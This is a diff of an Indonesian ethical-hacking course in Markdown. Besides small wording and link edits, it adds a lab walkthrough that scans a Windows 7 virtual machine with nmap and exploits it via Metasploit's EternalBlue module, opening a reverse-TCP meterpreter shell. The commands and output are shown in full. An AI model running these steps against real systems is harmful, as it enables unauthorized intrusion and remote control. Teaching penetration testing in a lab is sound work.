@@ -10,10 +10,11 @@ Ethical hacker wajib mengikuti aturan tertentu, termasuk menjaga kerahasiaan inf
 
 Tahapan ethical hacking secara umum adalah:
 1.  __Reconnaissance / Information Gathering__: Mengumpulkan informasi tentang target.
-2.  __Scanning__: Menemukan kelemahan keamanan dalam sistem target. Scanning sebenarnya masih termasuk ke dalam _information gathering_, akan tetapi informasi yang dikumpulkan lebih bersifat private (scanning hanya boleh dilakukan bila sudah mendapat ijin dari pemilik sistem). Hasil dari scanning kita bisa melakukan __Vulnerability Analysis__ yaitu  proses untuk mengidentifikasi, menganalisis, dan mengelompokkan tingkat risiko kerentanan/kelemahan pada sistem target.
-3. __Exploitation__: Mengeksploitasi kelemahan keamanan untuk mendapatkan akses ke sistem target.
-4. __Maintaining Access__: Mempertahankan akses ke sistem target.
-5. __Covering Tracks__: Menghapus jejak aktivitas ethical hacker.
+2.  __Scanning__: Menemukan kelemahan keamanan dalam sistem target. Scanning sebenarnya masih termasuk ke dalam _information gathering_, akan tetapi informasi yang dikumpulkan lebih bersifat private (scanning hanya boleh dilakukan bila sudah mendapat ijin dari pemilik sistem). 
+3. __Vulnerability Analysis__: yaitu  proses untuk mengidentifikasi, menganalisis, dan mengelompokkan tingkat risiko kerentanan/kelemahan pada sistem target.
+4. __Exploitation__: Mengeksploitasi kelemahan keamanan untuk mendapatkan akses ke sistem target.
+5. __Maintaining Access__: Mempertahankan akses ke sistem target.
+6. __Covering Tracks__: Menghapus jejak aktivitas ethical hacker.
 
 ### Peran Ethical Hacking untuk Perusahaan/Instansi
 
@@ -29,38 +30,38 @@ Jasa ethical hacker dapat meningkatkan tingkat keamanan siber mereka secara sign
 
 Menjadi seorang ethical hacker memerlukan keterampilan teknis yang mendalam serta pemahaman tentang banyak aspek keamanan siber. Berikut adalah beberapa skill penting yang harus dimiliki oleh seorang ethical hacker:
 
-1. __Programming__
+1. __Programming__.
 Seorang ethical hacker perlu memiliki pengetahuan yang baik tentang programming. Ini karena mereka harus mampu memahami kode dan menemukan kelemahan yang mungkin ada di dalamnya. Bahasa pemrograman seperti Python, C, C++, Java, dan Perl sering digunakan dalam ethical hacking.
 
-2. __Jaringan Komputer__
+2. __Jaringan Komputer__.
 Pemahaman mendalam tentang jaringan komputer sangat penting bagi seorang ethical hacker. Mereka harus tahu bagaimana jaringan berfungsi, bagaimana paket data ditransfer, dan bagaimana serangan bisa dilakukan pada infrastruktur jaringan. Pengetahuan tentang protokol seperti TCP/IP, DNS, dan DHCP sangat penting dalam bidang ini.
 
-3. __Database__
+3. __Database__.
 Database menyimpan banyak informasi sensitif, dan seorang ethical hacker harus mampu mengeksplorasi dan menemukan kelemahan dalam sistem database. Mereka perlu memahami SQL serta cara melindungi database dari serangan injeksi SQL atau akses tidak sah.
 
-4. __Hacking Tools__
+4. __Hacking Tools__.
 Seorang ethical hacker harus menguasai berbagai hacking tools yang digunakan untuk melakukan tes penetrasi dan evaluasi keamanan. Tools populer yang sering digunakan dalam ethical hacking antara lain Kali Linux, Metasploit, Nmap, dan Wireshark.
 
-5. __Pengetahuan tentang Script__
+5. __Pengetahuan tentang Script__.
 Kemampuan untuk menulis dan memahami script juga penting bagi ethical hacker. Dengan script, mereka dapat mengotomatisasi serangan atau tes penetrasi tertentu, yang dapat membantu mereka menemukan kelemahan keamanan dengan lebih efisien.
 
 ### Peraturan dan Etika dalam Ethical Hacking
 
 Meski ethical hacking adalah praktik legal dan bermanfaat, ada sejumlah aturan dan etika yang harus dipatuhi oleh para ethical hacker. Hal ini penting untuk memastikan bahwa kegiatan mereka tidak melanggar hukum atau merugikan pihak lain.
 
-1. __Izin yang Sah__
+1. __Izin yang Sah__.
 Seorang ethical hacker hanya boleh melakukan tes penetrasi atau simulasi serangan dengan izin yang sah dari pemilik sistem atau jaringan. Tanpa izin, kegiatan hacking tersebut bisa dianggap ilegal.
 
-2. __Batasan yang Jelas__
+2. __Batasan yang Jelas__.
 Setiap pekerjaan ethical hacking harus memiliki batasan yang jelas, termasuk tentang area mana yang boleh diuji dan metode apa yang boleh digunakan. Ini penting untuk memastikan bahwa tindakan mereka tidak menyebabkan kerusakan yang tidak disengaja pada sistem.
 
-3. __Kerahasiaan dan Privasi__
+3. __Kerahasiaan dan Privasi__.
 Ethical hacker harus menjaga kerahasiaan data yang mereka akses selama proses hacking. Mereka tidak boleh menyebarkan informasi sensitif atau memanfaatkannya untuk keuntungan pribadi.
 
-4. __Tanggung Jawab Profesional__
+4. __Tanggung Jawab Profesional__.
 Seorang ethical hacker harus bertindak secara profesional dan bertanggung jawab. Mereka harus melaporkan temuan dengan jujur dan memberikan saran yang tepat untuk memperbaiki kelemahan yang ditemukan.
 
-5. __Melaporkan Temuan dengan Jujur__
+5. __Melaporkan Temuan dengan Jujur__.
 Setiap temuan yang didapatkan selama proses ethical hacking harus dilaporkan dengan jujur kepada pemilik sistem. Ini termasuk segala jenis kelemahan atau celah keamanan yang bisa dieksploitasi oleh peretas jahat.
 
 ### Sertifikasi Ethical Hacking
@@ -85,7 +86,8 @@ Pada course ini kita membutuhkan tool untuk membangun Hacking Lab:
 
 * [VirtualBox](https://www.virtualbox.org/): Digunakan sebagai mesin virtualisasi untuk menginstal sistem operasi. Virtualbox dapat diganti dengan mesin virtual lainnya seperti VMWare dll.
 * [Kali Linux](https://www.kali.org/): Sistem operasi berbasis Linux yang didesain untuk bisa melakukan kegiatan Ethical Hacking.
-* Metasploitable.
+* [Metasploitable](https://docs.rapid7.com/metasploit/metasploitable-2/): Vurnerability manchine sebagai mesin target serangan.
+* Windows 7 sebagai mesin target.
 
 ### Tool
 1. __Reconnaissance (_Information Gathering_)__ / Mengumpulkan informasi
@@ -114,14 +116,14 @@ Sebelum memulai course ini beberapa kebutuhan yang wajib sudah dipahami:
 ## Referensi
 * [https://bif.telkomuniversity.ac.id/](https://bif.telkomuniversity.ac.id/apa-itu-ethical-hacking-dan-bagaimana-menjadi-seorang-ethical-hacker/#:~:text=Ethical%20hacking%20adalah%20proses%20di,bisa%20dimanfaatkan%20oleh%20penyerang%20jahat.) - Apa Itu Ethical Hacking dan Bagaimana Menjadi Seorang Ethical Hacker?
 
-## 2. Reconnaissance
+## 2. Reconnaissance /  Information Gathering
 
 Reconnaissance / Information Gathering adalah kegiatan mengumpulkan informasi tentang target. Informasi yang dikumpulkan bisa berupa ip address, username, email, teknologi, OS, informasi suatu website dll. Information Gathering pada umumnya bersifat legal karena informasi yang dibutuhkan masih bersifat public.
 
 Information Gathering terbagi 2:
 
 1. Active Information Gathering: Mengumpulkan informasi dengan berinteraksi langsung dengan target. Bisa juga dilakukan dengan orangnya untuk mendapatkan informasi (Social Engineering).
-2. Pasive Information Gathering: Mengumpulkan infomasi melalui pihak ketiga, misal menggunakan google untuk mendapatkan informasi target.
+2. Pasive Information Gathering: Mengumpulkan infomasi melalui pihak ketiga, misal menggunakan search engine seperti google, yahoo dll. untuk mendapatkan informasi target.
 
 ### Ping
 
@@ -251,7 +253,7 @@ Scaning merupakan proses mengumpulkan informasi yang bersifat private, yang seha
 
 Kita membutuhkan vulnerability manchine untuk latihan sebagai target serangan, berikut manchine tool yang digunakan:
 
-* Metasploitable (ip target 192.168.1.32)
+* [Metasploitable](https://docs.rapid7.com/metasploit/metasploitable-2/) (contoh ip target 192.168.1.32)
 
 ### netdiscover
 
@@ -295,6 +297,8 @@ Nmap memiliki berbagai fitur, di antaranya:
 * Deteksi sistem operasi dengan menganalisis respons dari target 
 * Nmap Scripting Engine (NSE) untuk menjalankan skrip khusus selama pemindaian 
 * Host discovery untuk memeriksa dan mendeteksi keberadaan host di sebuah jaringan 
+
+> Baca Juga: [https://nmap.org/man/id/index.html](https://nmap.org/man/id/index.html)
 
 __Scanning ip__
 
@@ -2281,6 +2285,7 @@ Selanjutnya kita akan mencoba exploit java rmi, buka console metasploit:
 
 ```bash
 $ msfconsole
+
 Metasploit tip: Search can apply complex filters such as search cve:2009 
 type:exploit, see all the filters with help search
                                                   
@@ -2421,3 +2426,316 @@ meterpreter >
 ```
 
 Bangggg!!!! kita berhasil exploit java rmi tapi ada yang berbeda kali ini kita masuk kedalam session menggunakan `meterpreter`. Kelebihan `meterpreter` kita bisa menggunakan perintah tambahan, dan untuk menggunakan perintah tersebut kita bisa menggunakan perintah `help` untuk sebagai petunjuk.
+
+#### Exploit Windows 7 dengan Eternalblue
+
+EternalBlue adalah perangkat lunak eksploitasi komputer yang dikembangkan oleh Badan Keamanan Nasional AS (NSA). Perangkat lunak ini didasarkan pada kerentanan di Microsoft Windows yang memungkinkan pengguna memperoleh akses ke sejumlah komputer yang terhubung ke suatu jaringan . NSA mengetahui tentang kerentanan ini tetapi tidak mengungkapkannya kepada Microsoft selama beberapa tahun, karena mereka berencana untuk menggunakannya sebagai mekanisme pertahanan terhadap serangan siber. Pada tahun 2017, NSA menemukan bahwa perangkat lunak tersebut dicuri oleh sekelompok peretas yang dikenal sebagai Shadow Brokers . Microsoft diberitahu tentang hal ini dan merilis pembaruan keamanan pada bulan Maret 2017 untuk menambal kerentanan tersebut. Sementara ini terjadi, kelompok peretas tersebut mencoba melelang perangkat lunak tersebut, tetapi tidak berhasil menemukan pembeli. EternalBlue kemudian dirilis ke publik pada tanggal 14 April 2017.
+
+__Step 1__
+
+Install Windows 7 (_catatan: non aktifkan firewall pada Windows 7_)
+
+__Step 2__
+
+Scan target
+
+```bash
+$ nmap -p- -A -T4 192.168.1.5
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 21:45 +08
+Nmap scan report for 192.168.1.5 (192.168.1.5)
+Host is up (0.00050s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 08:00:27:62:D8:67 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: WINDOWS7; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: WINDOWS7, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:62:d8:67 (Oracle VirtualBox virtual NIC)
+|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: -1s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: Windows7
+|   NetBIOS computer name: WINDOWS7\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-12-18T21:46:40+08:00
+| smb2-time: 
+|   date: 2024-12-18T13:46:40
+|_  start_date: 2024-12-18T12:30:20
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.50 ms 192.168.1.5 (192.168.1.5)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 98.19 seconds
+```
+
+__Step 3__
+
+Buka `msfconsole` dan search eternalblue.
+
+```bash
+$ msfconsole
+
+Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
+with setg RHOSTS x.x.x.x
+                                                  
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .
+             ' @@@ @@   @@    ,
+              `.@@@@    @@   .
+                ',@@     @   ;           _____________
+                 (   3 C    )     /|___ / Metasploit! \
+                 ;@'. __*__,."    \|--- \_____________/
+                  '(.,...."/
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search eternalblue
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                                                                          
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+msf6 > 
+```
+
+Dari hasil di atas terdapat banyak exploit dari eternalblue, kita bisa mencoba `24  auxiliary/scanner/smb/smb_ms17_010` untuk mencari vurnerability target windows.
+
+```bash
+msf6 > use 24
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting              Required  Description
+   ----         ---------------              --------  -----------
+   CHECK_ARCH   true                         no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                         no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                        no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-frame  yes       List of named pipes to check
+                work/data/wordlists/named_p
+                ipes.txt
+   RHOSTS                                    yes       The target host(s), see https://docs.metasploi
+                                                       t.com/docs/using-metasploit/basics/using-metas
+                                                       ploit.html
+   RPORT        445                          yes       The SMB service port (TCP)
+   SMBDomain    .                            no        The Windows domain to use for authentication
+   SMBPass                                   no        The password for the specified username
+   SMBUser                                   no        The username to authenticate as
+   THREADS      1                            yes       The number of concurrent threads (max one per
+                                                       host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.5
+RHOSTS => 192.168.1.5
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[+] 192.168.1.5:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.1.5:445       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > 
+```
+
+Dari hasil di atas ditemukan `Host is likely VULNERABLE` yang berarti kemungkinan terdapat vurnerability pada mesin Windows 7.
+
+Kita bisa mencari lagi eternalblue dan menggunakan exploit `0   exploit/windows/smb/ms17_010_eternalblue`:
+
+```bash
+msf6 auxiliary(scanner/smb/smb_ms17_010) > search eternalblue
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > use 0
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         192.168.1.5      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.5
+RHOSTS => 192.168.1.5
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 192.168.1.21:4444 
+[*] 192.168.1.5:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.1.5:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.1.5:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.5:445 - The target is vulnerable.
+[*] 192.168.1.5:445 - Connecting to target for exploitation.
+[+] 192.168.1.5:445 - Connection established for exploitation.
+[+] 192.168.1.5:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.1.5:445 - CORE raw buffer dump (40 bytes)
+[*] 192.168.1.5:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
+[*] 192.168.1.5:445 - 0x00000010  61 73 69 63 20 37 36 30 31 20 53 65 72 76 69 63  asic 7601 Servic
+[*] 192.168.1.5:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
+[+] 192.168.1.5:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.1.5:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.1.5:445 - Sending all but last fragment of exploit packet
+[*] 192.168.1.5:445 - Starting non-paged pool grooming
+[+] 192.168.1.5:445 - Sending SMBv2 buffers
+[+] 192.168.1.5:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.1.5:445 - Sending final SMBv2 buffers.
+[*] 192.168.1.5:445 - Sending last fragment of exploit packet!
+[*] 192.168.1.5:445 - Receiving response from exploit packet
+[+] 192.168.1.5:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.1.5:445 - Sending egg to corrupted connection.
+[*] 192.168.1.5:445 - Triggering free of corrupted buffer.
+[*] Sending stage (203846 bytes) to 192.168.1.5
+[*] Meterpreter session 2 opened (192.168.1.21:4444 -> 192.168.1.5:49161) at 2024-12-18 22:00:06 +0800
+[+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter >
+```
+
+Bangg!!! kita berhasil mengesploit Windows 7, untuk perintah di dalam `meterpreter` bisa menggunakan `help` atau kunjungi [Meterpreter Basics Command](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/).
+
+>__Baca Juga__
+>* [https://en.wikipedia.org/wiki/EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)
+>* [Meterpreter Basics Command](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
